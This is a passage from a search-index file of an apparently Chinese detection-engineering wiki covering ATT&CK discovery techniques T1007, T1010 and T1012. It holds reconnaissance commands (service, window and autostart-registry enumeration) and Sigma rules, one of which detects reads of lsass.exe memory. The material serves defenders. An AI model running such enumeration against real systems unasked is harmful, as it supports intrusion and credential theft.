Application","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_4","text":"windows \u5b89\u5168\u65e5\u5fd7\u3001\u8fdb\u7a0b\u521b\u5efa\u3001\u8fdb\u7a0b\u5173\u95ed\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7b49","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1007 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\sc.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: SC * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: medium title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1007 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: tasklist * #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: # *5 EventID: 4703 #\u4e00\u4e2a\u7528\u6237\u7684\u6743\u9650\u88ab\u8c03\u6574\u3002 ProcessName: 'C:\\Windows\\System32\\whoami.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d EnabledPrivileges: 'SeDebugPrivilege' #\u542f\u7528\u7684\u6743\u9650 selection3: EventID: 4690 #\u8bd5\u56fe\u5c06\u53e5\u67c4\u590d\u5236\u5230\u5bf9\u8c61\u3002 selection4: EventID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection5: EventID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 Objectname: '\\Device\\HarddiskVolume4\\Windows\\System32\\lsass.exe' #\u5bf9\u8c61>\u5bf9\u8c61\u540d ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection6: EventID: 4633 #\u8bd5\u56fe\u8bbf\u95ee\u5bf9\u8c61\u3002 Objectname: '\\Device\\HarddiskVolume4\\Windows\\System32\\lsass.exe' #\u5bf9\u8c61>\u5bf9\u8c61\u540d ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d Access: \u8bfb\u53d6\u8fdb\u7a0b\u5185\u5b58 #\u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f>\u8bbf\u95ee selection7: EventID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 ProcessName: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection8: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\tasklist.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d Exitstatus: 0x0 #\u8fdb\u7a0b\u4fe1\u606f>\u9000\u51fa\u72b6\u6001 timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium title: windows \u7cfb\u7edf\u670d\u52a1\u53d1\u73b0 description: windows server 2016 references: tags: T1007 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\windows\\system32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net start #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 Newprocessname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: C:\\Windows\\system32\\net1 start #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c selection3: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d selection4: EventID: 4689 #\u5df2\u9000\u51fa\u8fdb\u7a0b ProcessName: 'C:\\Windows\\System32\\net.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d timeframe: last 1m #\u53ef\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8c03\u6574 condition: all of them level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_6","text":"\u7cfb\u7edf\u670d\u52a1\u53d1\u73b0\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4e0d\u80fd\u4e00\u4e00\u5217\u4e3e\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1007-win-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1007 https://attack.mitre.org/techniques/T1007/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/","text":"T1010-win-\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u6253\u5f00\u7684\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u7684\u5217\u8868\u3002\u7a97\u53e3\u5217\u8868\u53ef\u4ee5\u4f20\u8fbe\u6709\u5173\u5982\u4f55\u4f7f\u7528\u7cfb\u7edf\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4e3a\u952e\u76d8\u8bb0\u5f55\u7a0b\u5e8f\u6536\u96c6\u7684\u4fe1\u606f\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002 \u5728Mac\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u5c0f\u7684AppleScript\u811a\u672c\u672c\u673a\u5b8c\u6210\u3002 \u6d4b\u8bd5\u6848\u4f8b Windows server 2016\u6a21\u62df\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u53d1\u73b0\u6b63\u5728\u8fd0\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u3002 get-process | where-object {$_.mainwindowtitle -ne \"\"} | Select-Object mainwindowtitle \u901a\u8fc7COM\u65b9\u6cd5\u83b7\u53d6\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\uff0c\u8fd8\u5305\u62ec\u8fc7\u7a0b\u8def\u5f84\u548c\u7a97\u53e3\u4f4d\u7f6e\u5750\u6807\uff1a [activator]::CreateInstance([type]::GetTypeFromCLSID(\"13709620-C279-11CE-A49E-444553540000\")).windows() \u68c0\u6d4b\u65e5\u5fd7 Windows powershell\u65e5\u5fd7\uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u5f00\u542fpowershell\u5ba1\u6838\u7b56\u7565\uff0c\u4f4e\u7248\u672cpowershell\u65e0\u6cd5\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff09 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows\u672c\u5730\u6267\u884cPowershell\u547d\u4ee4\uff0c\u679a\u4e3e\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3 description: windows server 2016 references: \u6682\u65e0 tags: T1010 status: experimental author: 12306Bro logsource: product: windows service: powershell detection: selection: EventID: 4104 #\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4 message: - 'get-process | where-object {$_.mainwindowtitle -ne \"\"} | Select-Object mainwindowtitle' #\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4b\uff0c\u68c0\u51fa\u7387\u8f83\u4f4e - [activator]::CreateInstance([type]::GetTypeFromCLSID(\"13709620-C279-11CE-A49E-444553540000\")).windows() #\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4b\uff0c\u68c0\u51fa\u7387\u8f83\u4f4e condition: selection level: low \u5efa\u8bae \u5f53\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u65f6\uff0c\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u4f1a\u5728\u6574\u4e2a\u64cd\u4f5c\u4e2d\u51fa\u73b0\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u5c06\u5176\u89c6\u4e3a\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\uff0c\u8fd9\u4e9b\u884c\u4e3a\u53ef\u80fd\u5bfc\u81f4\u57fa\u4e8e\u6240\u83b7\u53d6\u4fe1\u606f\u7684\u5176\u4ed6\u6d3b\u52a8\u3002 \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u4e86\u89e3\u53ef\u4ee5\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u6765\u83b7\u53d6\u4fe1\u606f\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1010 https://attack.mitre.org/techniques/T1010/ \u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u53d1\u73b0 https://ired.team/offensive-security/enumeration-and-discovery/t1010-application-window-discovery","title":"T1010-win-\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#t1010-win-","text":"","title":"T1010-win-\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u83b7\u53d6\u6253\u5f00\u7684\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u7684\u5217\u8868\u3002\u7a97\u53e3\u5217\u8868\u53ef\u4ee5\u4f20\u8fbe\u6709\u5173\u5982\u4f55\u4f7f\u7528\u7cfb\u7edf\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4e3a\u952e\u76d8\u8bb0\u5f55\u7a0b\u5e8f\u6536\u96c6\u7684\u4fe1\u606f\u63d0\u4f9b\u4e0a\u4e0b\u6587\u3002 \u5728Mac\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528\u5c0f\u7684AppleScript\u811a\u672c\u672c\u673a\u5b8c\u6210\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_1","text":"Windows server 2016\u6a21\u62df\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u53d1\u73b0\u6b63\u5728\u8fd0\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u3002 get-process | where-object {$_.mainwindowtitle -ne \"\"} | Select-Object mainwindowtitle \u901a\u8fc7COM\u65b9\u6cd5\u83b7\u53d6\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\uff0c\u8fd8\u5305\u62ec\u8fc7\u7a0b\u8def\u5f84\u548c\u7a97\u53e3\u4f4d\u7f6e\u5750\u6807\uff1a [activator]::CreateInstance([type]::GetTypeFromCLSID(\"13709620-C279-11CE-A49E-444553540000\")).windows()","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_2","text":"Windows powershell\u65e5\u5fd7\uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u5f00\u542fpowershell\u5ba1\u6838\u7b56\u7565\uff0c\u4f4e\u7248\u672cpowershell\u65e0\u6cd5\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows\u672c\u5730\u6267\u884cPowershell\u547d\u4ee4\uff0c\u679a\u4e3e\u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3 description: windows server 2016 references: \u6682\u65e0 tags: T1010 status: experimental author: 12306Bro logsource: product: windows service: powershell detection: selection: EventID: 4104 #\u6267\u884c\u8fdc\u7a0b\u547d\u4ee4 message: - 'get-process | where-object {$_.mainwindowtitle -ne \"\"} | Select-Object mainwindowtitle' #\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4b\uff0c\u68c0\u51fa\u7387\u8f83\u4f4e - [activator]::CreateInstance([type]::GetTypeFromCLSID(\"13709620-C279-11CE-A49E-444553540000\")).windows() #\u57fa\u4e8e\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4b\uff0c\u68c0\u51fa\u7387\u8f83\u4f4e condition: selection level: low","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_6","text":"\u5f53\u653b\u51fb\u8005\u4e86\u89e3\u73af\u5883\u65f6\uff0c\u7cfb\u7edf\u548c\u7f51\u7edc\u53d1\u73b0\u6280\u672f\u901a\u5e38\u4f1a\u5728\u6574\u4e2a\u64cd\u4f5c\u4e2d\u51fa\u73b0\u3002\u4e0d\u5e94\u5b64\u7acb\u5730\u770b\u5f85\u6570\u636e\u548c\u4e8b\u4ef6\uff0c\u800c\u5e94\u5c06\u5176\u89c6\u4e3a\u884c\u4e3a\u94fe\u7684\u4e00\u90e8\u5206\uff0c\u8fd9\u4e9b\u884c\u4e3a\u53ef\u80fd\u5bfc\u81f4\u57fa\u4e8e\u6240\u83b7\u53d6\u4fe1\u606f\u7684\u5176\u4ed6\u6d3b\u52a8\u3002 \u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u4e86\u89e3\u53ef\u4ee5\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u6536\u96c6\u7cfb\u7edf\u548c\u7f51\u7edc\u4fe1\u606f\u3002\u5177\u6709\u5185\u7f6e\u529f\u80fd\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u53ef\u4ee5\u76f4\u63a5\u4e0eWindows API\u4ea4\u4e92\u4ee5\u6536\u96c6\u4fe1\u606f\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7Windows\u7cfb\u7edf\u7ba1\u7406\u5de5\u5177\uff08\u4f8b\u5982Windows Management Instrumentation\u548cPowerShell\uff09\u6765\u83b7\u53d6\u4fe1\u606f\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1010-win-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AA%97%E5%8F%A3%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1010 https://attack.mitre.org/techniques/T1010/ \u5e94\u7528\u7a0b\u5e8f\u7a97\u53e3\u53d1\u73b0 https://ired.team/offensive-security/enumeration-and-discovery/t1010-application-window-discovery","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/","text":"T1012-win-\u67e5\u8be2\u6ce8\u518c\u8868 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4e0eWindows\u6ce8\u518c\u8868\u4ea4\u4e92\uff0c\u4ee5\u6536\u96c6\u6709\u5173\u7cfb\u7edf\u3001\u914d\u7f6e\u548c\u5df2\u5b89\u88c5\u8f6f\u4ef6\u7684\u4fe1\u606f\u3002 \u6ce8\u518c\u8868\u5305\u542b\u5927\u91cf\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u3001\u914d\u7f6e\u3001\u8f6f\u4ef6\u548c\u5b89\u5168\u6027\u7684\u4fe1\u606f\u3002\u4e00\u4e9b\u4fe1\u606f\u53ef\u80fd\u6709\u52a9\u4e8e\u653b\u51fb\u8005\u5728\u7f51\u7edc\u4e2d\u8fdb\u4e00\u6b65\u5f00\u5c55\u884c\u52a8\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u67e5\u8be2\u6ce8\u518c\u8868\u4e2d\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002 \u6d4b\u8bd5\u6848\u4f8b Windows server 2016\u6a21\u62dfBabyShark\u6267\u884c\u6267\u884c\u7684reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\u547d\u4ee4\u3002\u7531\u4e8e\u7f3a\u5c11\u76f8\u5e94\u7684\u6837\u672c\uff0c\u672c\u6d4b\u8bd5\u6848\u4f8b\u5229\u7528CMD\u7a97\u53e3\u6a21\u62df\u4ee5\u4e0a\u547d\u4ee4\u3002 \u68c0\u6d4b\u65e5\u5fd7 Windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Users\\Administrator>reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /ve \u9519\u8bef: \u7cfb\u7edf\u627e\u4e0d\u5230\u6307\u5b9a\u7684\u6ce8\u518c\u8868\u9879\u6216\u503c\u3002 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7\uff0c\u8fdb\u7a0b\u521b\u5efa\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows\u672c\u5730\u6267\u884creg query HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default description: windows server 2016 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1012/T1012.md tags: T1012 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: 'C:\\Windows\\System32\\reg.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: - reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices - reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" - reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" - reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" - reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" - reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run - reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\" - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5b9e\u9645\u60c5\u51b5\u4e0b\uff0c\u4f60\u53ef\u4ee5\u5bf9\u4efb\u4f55\u6ce8\u518c\u8868\u67e5\u8be2\u884c\u4e3a\u8fdb\u884c\u68c0\u6d4b condition: selection level: low \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1012 https://attack.mitre.org/techniques/T1012/ Windows\u4e0breg\u547d\u4ee4\u8be6\u89e3 https://www.jb51.net/article/30078.htm","title":"T1012-win-\u67e5\u8be2\u6ce8\u518c\u8868"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#t1012-win-","text":"","title":"T1012-win-\u67e5\u8be2\u6ce8\u518c\u8868"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4e0eWindows\u6ce8\u518c\u8868\u4ea4\u4e92\uff0c\u4ee5\u6536\u96c6\u6709\u5173\u7cfb\u7edf\u3001\u914d\u7f6e\u548c\u5df2\u5b89\u88c5\u8f6f\u4ef6\u7684\u4fe1\u606f\u3002 \u6ce8\u518c\u8868\u5305\u542b\u5927\u91cf\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u3001\u914d\u7f6e\u3001\u8f6f\u4ef6\u548c\u5b89\u5168\u6027\u7684\u4fe1\u606f\u3002\u4e00\u4e9b\u4fe1\u606f\u53ef\u80fd\u6709\u52a9\u4e8e\u653b\u51fb\u8005\u5728\u7f51\u7edc\u4e2d\u8fdb\u4e00\u6b65\u5f00\u5c55\u884c\u52a8\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u81ea\u52a8\u53d1\u73b0\u671f\u95f4\u4f7f\u7528\u67e5\u8be2\u6ce8\u518c\u8868\u4e2d\u7684\u4fe1\u606f\u6765\u5851\u9020\u540e\u7eed\u884c\u4e3a\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u76ee\u6807\u6216\u5c1d\u8bd5\u7279\u5b9a\u64cd\u4f5c\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_1","text":"Windows server 2016\u6a21\u62dfBabyShark\u6267\u884c\u6267\u884c\u7684reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\u547d\u4ee4\u3002\u7531\u4e8e\u7f3a\u5c11\u76f8\u5e94\u7684\u6837\u672c\uff0c\u672c\u6d4b\u8bd5\u6848\u4f8b\u5229\u7528CMD\u7a97\u53e3\u6a21\u62df\u4ee5\u4e0a\u547d\u4ee4\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_2","text":"Windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_3","text":"C:\\Users\\Administrator>reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /ve \u9519\u8bef: \u7cfb\u7edf\u627e\u4e0d\u5230\u6307\u5b9a\u7684\u6ce8\u518c\u8868\u9879\u6216\u503c\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_4","text":"windows 